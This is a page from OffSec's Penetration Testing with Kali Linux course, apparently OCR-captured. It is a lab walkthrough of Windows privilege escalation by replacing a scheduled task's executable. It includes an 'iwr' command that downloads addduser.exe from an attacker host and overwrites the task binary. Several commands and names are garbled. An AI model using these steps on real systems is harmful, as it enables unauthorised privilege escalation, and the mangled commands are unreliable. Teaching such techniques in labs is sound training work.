# # OffSec

Penetration Testing with Kali Linux

HostName: CLIENTTWK220
TaskName: \Microsoft\CacheCleanup
Next Run Time: 7/11/2022 2:47:21 AM
Status: Ready
Logon Mode: Interactive/Background
Last Run Time: 7/11/2022 2:46:22 AM
Last Result: 0
Author: CLIENTTWK220\davemin
Task To Run: C:\Users\steve\Pictures\BackendCacheCleanup.exe
Start In: C:\Users\steve\Pictures
Comment: N/A
Scheduled Task: Enabled
Idle Time: Disabled
Power Management: Stop On Battery Mode
Run User: davemin
Delete Task If Not Rescheduled: Disabled
Schedule Task If X Hours and X Mins: Disabled
Scheduling data is not available in this format.
Type: One Time, Only
Start Time: 7:37:21 AM
Start Date: 7/4/2022

Listing 448 - List of all tasks on CLIENTTWK220

Listing 448 shows information about a task \Microsoft\CacheCleanup. Interestingly, the task was created by davemin and the specified action is to execute BackendCacheCleanup.exe in the Pictures home directory of steve. In addition, the Last Run Time and Next Run Time indicate that the task is executed every minute. Task runs as user davemin.

Since the executable BackendCacheCleanup.exe is located in a subdirect of the home directory of steve, we have exclusive permissions on it. Let's check our permissions on this file with icacls.

```
PS C:\Users\steve icalls C:\Users\steve NT AUTHORITY\SYSTEM:(I) (F)
C:\Users\steve\Pictures\BackendCacheCleanup.exe BUILTIN\CLIENTTWK220\steve:(I) (F)
CLIENTTWK220\offsec:(I) (F)
```

Listing 449 - Display permissions on the executable BackendCacheCleanup.exe

As expected, we have Full (F) permissions, since the executable is in the home directory of steve, we can use our addduuser.exe to replace the executable specified in the action of the scheduled task.

To do so, we will use a Python3 script to serve our server-command, addduer.exe. We'll also copy the original BackendCacheCleanup.exe so we can restore it after our privilege escalation success.

```
PS C:\Users\steve iwr -Uri http://192.168.119.3/addduser.exe -Outfile\BackendCacheCleanup.exe
```

```
PS C:\Users\steve move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe
```

Listing 450 - Download and replace the executable BackendCacheCleanup.exe \Pictures\

PWK - © 2023 OffSec Services Limited. All rights reserved.

522